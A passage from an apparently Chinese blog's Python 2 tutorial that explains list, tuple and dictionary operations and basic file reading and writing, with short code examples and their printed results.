列表</h3><ul><li><p>简介<br>列表就是可变的数组，之所以是可变的是因为随随便便就可以增加和减少操作。形式如下:list = []。 访 问列表主要是索引和切片，索引从左到右第一个是0，从右到左第一个是-1；切片包含起始的数字，但 不包含末尾的数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Example:(访问列表两种方式，单个元素访问通常下标，多个元素访问通常切片。)</span><br><span class="line">list=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> list[<span class="number">0</span>],list[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">print</span> list[::<span class="number">-1</span>]  步长切片</span><br><span class="line">Result: <span class="number">1</span>    [<span class="number">2</span>,<span class="number">9</span>]    </span><br><span class="line">[<span class="number">4</span>，<span class="number">9</span>，<span class="number">2</span>，<span class="number">1</span>]</span><br></pre></td></tr></table></figure></li><li><p>追加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Example1:（单一追加）</span><br><span class="line">dota=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] </span><br><span class="line">dota.append(<span class="number">9</span>) </span><br><span class="line"><span class="keyword">print</span> dota </span><br><span class="line">Result: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>] </span><br><span class="line"></span><br><span class="line">Example2: (列表和列表之间追加) </span><br><span class="line">  dota1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] </span><br><span class="line">  dota2=[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>] </span><br><span class="line">  dota1.extend(dota2) </span><br><span class="line">Result: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">Example3: (+连接，*重复) </span><br><span class="line">  dota1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>] </span><br><span class="line">  dota2 = [<span class="number">3</span>,<span class="number">4</span>] </span><br><span class="line">  dota3 = dota1+dota2 </span><br><span class="line">  dota4 = dota2*<span class="number">2</span> </span><br><span class="line">  <span class="keyword">print</span> dota3,dota4</span><br><span class="line">Result: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>] [<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure></li><li><p>插入指定位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Example:</span><br><span class="line">dota=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">dota.insert(<span class="number">2</span>,<span class="number">9</span>) </span><br><span class="line"><span class="keyword">print</span> dota </span><br><span class="line">Result: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure></li><li><p>删除列表元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Example1:（删除末尾元素）</span><br><span class="line">dota=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] </span><br><span class="line">dota.pop()</span><br><span class="line"><span class="keyword">print</span> dota</span><br><span class="line">Result: [<span class="number">1</span>,<span class="number">2</span>] </span><br><span class="line"></span><br><span class="line">Example2:（删除指定位置的元素）</span><br><span class="line">dota=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] </span><br><span class="line">dota.pop(<span class="number">0</span>) </span><br><span class="line"><span class="keyword">print</span> dota</span><br><span class="line">Result: [<span class="number">2</span>,<span class="number">3</span>] </span><br><span class="line">Example3:（<span class="keyword">del</span>通过下标删除序列元素）</span><br><span class="line">dota=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">del</span> dota[<span class="number">0</span>] </span><br><span class="line"><span class="keyword">print</span> dota </span><br><span class="line">Result: [<span class="number">2</span>,<span class="number">3</span>] </span><br><span class="line">Example4: (remove删除指定元素,ps用于移除列表中某个值的第一个匹配项) </span><br><span class="line">dota=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">dota.remove(<span class="number">4</span>)</span><br><span class="line">Result:dota[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure></li><li><p>统计列表元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Example:(统计列表中元素出现的次数) </span><br><span class="line">dota=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>] </span><br><span class="line">num=dota.count(<span class="number">4</span>) </span><br><span class="line"><span class="keyword">print</span> num </span><br><span class="line">Result: <span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>查找元素返回其第一次出现的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Example:</span><br><span class="line">dota = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line">num=dota.index(<span class="number">2</span>) </span><br><span class="line"><span class="keyword">print</span> num </span><br><span class="line">Result: <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>列表其他技巧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Example1:列表嵌套列表，形成二维数组 </span><br><span class="line">s = [<span class="string">'python'</span>, <span class="string">'java'</span>, [<span class="string">'asp'</span>, <span class="string">'php'</span>], <span class="string">'scheme'</span>]</span><br><span class="line">s[<span class="number">2</span>][<span class="number">1</span>] </span><br><span class="line">Result: php </span><br><span class="line"></span><br><span class="line">Example2:列表中数据类型可以混杂 </span><br><span class="line">s = [<span class="string">'python'</span>,<span class="number">1</span>，<span class="literal">True</span>] </span><br><span class="line"></span><br><span class="line">Example3:其他数据类型转换成列表(也可以说是列表的其他写法) </span><br><span class="line">d=list(<span class="string">'abcd'</span>) </span><br><span class="line"><span class="keyword">print</span> d,type(d) </span><br><span class="line">Result: [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>]  &lt;type <span class="string">'list'</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x02-元组"><a href="#0x02-元组" class="headerlink" title="0x02 元组"></a>0x02 元组</h3><ul><li><p>简介<br>元组是不可变数组，因此当定义一个tuple时候它的元素就必须被确定下来，不能改变；list和tuple区别 主要表现在list可以变能给下标赋值修改，而tuple不能；因此tuple不可变代码更安全，如果可能，能用 tuple代替list就尽量用tuple,比如你写了一个API，然后要交给别人来对接，但是你想保证你的代码的安 全以及不想让别人动你的代码，此时tuple就是相对合适的选择。 </p></li><li><p>查找元素返回其第一次出现的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Example:</span><br><span class="line">dota = (<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>)</span><br><span class="line">num=dota.index(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> num</span><br><span class="line">Result: <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>统计元组中元素出现的次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Example: </span><br><span class="line">dota=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">num=dota.count(<span class="number">4</span>) </span><br><span class="line"><span class="keyword">print</span> num </span><br><span class="line">Result: <span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>元组其他技巧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Example1: 其他类型转换成元组</span><br><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=tuple(a) </span><br><span class="line"><span class="keyword">print</span> b </span><br><span class="line">Result:  (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>) </span><br><span class="line"></span><br><span class="line">Example2: 区别点 </span><br><span class="line">a= (<span class="number">4</span>)    类型type(a)是int </span><br><span class="line">a=(<span class="number">4</span>,)    类型type(a)是tuple</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x03-字典"><a href="#0x03-字典" class="headerlink" title="0x03 字典"></a>0x03 字典</h3><ul><li>简介<br>格式如下:d = {key1 : value1, key2 : value2 }  方法.keys()返回字典所有键的列表，.items()返回字典所有值的列表。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">常用方法: </span><br><span class="line">Example1：访问元素</span><br><span class="line">a=&#123;<span class="string">'1'</span>:<span class="string">'dota'</span>,<span class="string">'2'</span>:<span class="string">'dota2'</span>&#125; </span><br><span class="line">a[<span class="string">'1'</span>] </span><br><span class="line">Result:‘dota’ </span><br><span class="line"></span><br><span class="line">Example2: </span><br><span class="line">a=&#123;<span class="string">'1'</span>:<span class="string">'dota'</span>,<span class="string">'2'</span>:<span class="string">'dota2'</span>&#125;</span><br><span class="line">a[a.keys()[<span class="number">0</span>]]</span><br><span class="line">Result：dota </span><br><span class="line"></span><br><span class="line">Example3:</span><br><span class="line">a.items显示所有元素 </span><br><span class="line"><span class="keyword">for</span> k，v <span class="keyword">in</span> d.iteritems():迭代列生成 </span><br><span class="line"><span class="keyword">print</span> k ,v </span><br><span class="line"></span><br><span class="line">Example4: </span><br><span class="line">dict(zip(‘abc’,range(<span class="number">2</span>)))字典生成 </span><br><span class="line">&#123;k:v <span class="keyword">for</span> k,v <span class="keyword">in</span> zip(“abc”,range(<span class="number">3</span>))&#125;生成字典</span><br></pre></td></tr></table></figure></li></ul><h2 id="三、Python文件操作"><a href="#三、Python文件操作" class="headerlink" title="三、Python文件操作"></a>三、Python文件操作</h2><h3 id="0x01-读文件"><a href="#0x01-读文件" class="headerlink" title="0x01 读文件"></a>0x01 读文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+ 文本模式【r ASCll编码】</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'password.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f：   <span class="comment">#使用这种方式打开文件，不用考虑close()</span></span><br><span class="line"> <span class="keyword">print</span> f.read() <span class="comment">#一次读取所有内容，返回str（在列知道文件大小下别随便用，万一大于自己内存的大小直接爆） </span></span><br><span class="line"> <span class="keyword">print</span> f.read(<span class="number">1</span>)              <span class="comment">#读取第一个字符</span></span><br><span class="line"> <span class="keyword">print</span> f.readline()          <span class="comment">#读取每行内容</span></span><br><span class="line"> <span class="keyword">print</span> f.readlines()        <span class="comment">#一次读取所有行内容，返回list</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+ 二进制模式   【rb 图片，视频等】 </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'mm.jpg'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> fr: </span><br><span class="line">     fr.read() </span><br><span class="line">Result:<span class="string">'\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...'</span></span><br><span class="line">ps：如果读取非ascll编码文件，就必须用二进制模式打开，然后再解码，但是解码会很麻烦，因此可以使用codecs</span><br><span class="line"><span class="keyword">import</span> codecs </span><br><span class="line"><span class="keyword">with</span> codecs.open(<span class="string">'mm.jpg'</span>.<span class="string">'rb'</span>,<span class="string">'gbk'</span>) <span class="keyword">as</span> fr: </span><br><span class="line">fr.read() </span><br><span class="line">Result:<span class="string">u'\u6d4b\u8bd5'</span></span><br></pre></td></tr></table></figure><h3 id="0x02-写文件"><a href="#0x02-写文件" class="headerlink" title="0x02 写文件"></a>0x02 写文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"password.txt"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> fw: </span><br><span class="line">fw.write(<span class="string">'Dota'</span>) <span class="comment">#注意每次写会覆盖掉前一次。</span></span><br></pre></td></tr></table></figure><h3 id="0x03-其他读写方式"><a href="#0x03-其他读写方式" class="headerlink" title="0x03 其他读写方式"></a>0x03 其他读写方式</h3><p>r 只读不可写（默认如果不写就是r）<br>w 只写（如果用w会把之前内容清空掉）<br>a 追加（自动添加在文件的末尾）<br>r+ 可读可写，若文件不存在，报错<br>w+ 可读可写，若文件不存在，创建<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">对文件读写操作优雅写法</span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'password.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> fr,open(<span class="string">'save.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> fw：</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fr: </span><br><span class="line">fw.write(line.lstrip(<span class="string">'/'</span>))</span><br><span class="line">fw.flush() </span><br><span class="line"><span class="keyword">except</span> IOError, e: </span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对文件的读取并且自动去换行优雅写法 </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> fr: </span><br><span class="line">data = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> fr.readlines()] </span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">减压读取文件优雅写法</span><br><span class="line">with open(&apos;1.txt&apos;,&apos;r&apos;) as fr: </span><br><span class="line">    for i in fr: </span><br><span class="line">print i </span><br><span class="line"></span><br><span class="line">with open(&apos;1.txt&apos;,&apos;r&apos;)as fr: </span><br><span class="line">for i in fr.readlines(): </span><br><span class="line">print i </span><br><span class="line">#虽然都能读取文件，但是当文件数量大的时候第一种明显不合适。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">同时读取多个文件 </span><br><span class="line"><span class="keyword">with</span> open(filename1) <span class="keyword">as</span> fp1, open(filename2) <span class="keyword">as</span> fp2, open(filename3) <span class="keyword">as</span> fp3:</span><br><span class="line"><span class="keyword">for</span> l1 <span class="keyword">in</span> fp1: </span><br><span class="line">l2 = fp2.readline() </span><br><span class="line">l3 = fp3.readline()</span><br></pre></td></tr></table></figure><h3 id="0x04-备注"><a href="#0x04-备注" class="headerlink" title="0x04 备注"></a>0x04 备注</h3><ul><li>结尾换行标志(通过os.linesep获取当前系统换行标志)  Linux \n  Mac \r  Windows \r\n</li><li>文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件 数量也 是有限的，由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所 以，为了保证无论是否出错都能正确地关闭文件，我们可以使用try … ﬁnally来实现,但是这样不够优 美，因此用with…as方式最合适。</li><li>readline和readlines如果不对每一行空白字符做处理，然后print输出的话，每一行输出的末尾会有两个换行，一个是读取附带的，还一个是print带的，因为print自带一个换行，如果不希望print带换行，则输出的时候末尾加个逗号。</li><li>fr.name 输出当前文件名  fr.ﬂush() 刷新  fw.truncate() 清空文件</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、Python基础&quot;&gt;&lt;a href=&quot;#一、Python基础&quot; class=&quot;headerlink&quot; title=&quot;一、Python基础&quot;&gt;&lt;/a&gt;一、Python基础&lt;/h2&gt;&lt;h3 id=&quot;0x01-运行机制&quot;&gt;&lt;a href=&quot;#0x01-运行机制&quot; class=&quot;headerlink&quot; title=&quot;0x01 运行机制&quot;&gt;&lt;/a&gt;0x01 运行机制&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;python解释型语言，因此在运行时解释器将源码转换为字节码，然后再由解释器来执行这些字节码。虚拟机执行脚本:1.完成模块的加载和链接；2.将源代码翻译为PyCodeObject对象（这货就是字节码），并将其写入内存当中（方便CPU读取，起到加速程序运行的作用）；3.从上述内存空间中读取指令并执行；4. 程序结束后，根据命令行调用情况（即运行程序的方式）决定是否将PyCodeObject写回硬盘当中（也就是 直接复制到.pyc或.pyo文件中）；5.之后若再次执行该脚本，则先检查本地是否有上述字节码文件。有则执行，否则重复上述步骤。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Python" scheme="https://dayu.ink/categories/Python/"/>
    
    
      <category term="Python" scheme="https://dayu.ink/tags/Python/"/>
    
  </entry>
  
</feed>
